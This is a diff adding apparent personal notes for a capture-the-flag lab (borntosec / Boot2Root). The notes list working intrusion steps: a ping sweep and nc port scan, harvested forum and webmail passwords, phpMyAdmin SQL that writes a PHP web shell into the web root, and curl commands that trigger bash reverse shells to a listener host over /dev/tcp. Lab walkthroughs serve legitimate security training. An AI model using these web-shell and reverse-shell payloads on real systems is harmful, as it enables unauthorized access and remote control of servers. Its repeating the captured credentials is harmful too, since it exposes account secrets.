@@ -1,0 +1,60 @@
+1 How to found IP address:
+
+for ip in $(seq 1 254); do ping -c 1 10.13.100.$ip | grep "64 bytes" & done > ip
+
+2 How to scan port :
+
+for port in $(seq 1 9999); do
+    echo "Scanning 10.13.100.250 on port $port..."
+    nc -zv 10.13.100.250 $port 2>&1 | grep succeeded
+done > port 
+
+3 Port 80
+
+4 Forum
+
+https://10.13.100.236/forum/
+https://10.13.100.236/forum/index.php?id=6
+
+lmezard: !q\]Ej?*5K5cy*AJ
+
+https://10.13.100.236/forum/index.php?mode=user&action=edit_profile
+
+laurie@borntosec.net
+
+5 Email 
+
+https://10.13.100.236/webmail/src/login.php
+
+https://10.13.100.236/webmail/src/webmail.php
+
+root Fg-'kKXBj87E:aJ$
+
+6 Databases 
+
+
+Sqlinjection
+https://10.13.100.236/phpmyadmin/
+
+
+SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/forum/templates_c/shell.php'
+
+Listen on 
+nc -lvnp 4242
+
+bash reverse shell:
+
+curl -k "https://10.13.100.236/forum/templates_c/shell.php?cmd=bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/10.13.100.96/4242%200%3E%261'"
+
+------------------------------------------
+
+SELECT '<?php system("bash -c \'exec bash -i &>/dev/tcp/10.13.100.96/4444 <&1\'"); ?>' INTO OUTFILE '/var/www/forum/templates_c/alt_shell.php'
+
+nc -lvnp 4444
+curl -k "https://10.13.100.236/forum/templates_c/alt_shell.php"
+
+-----------------------------------------
+
+cd /home/LOOKATME
+
+cat password
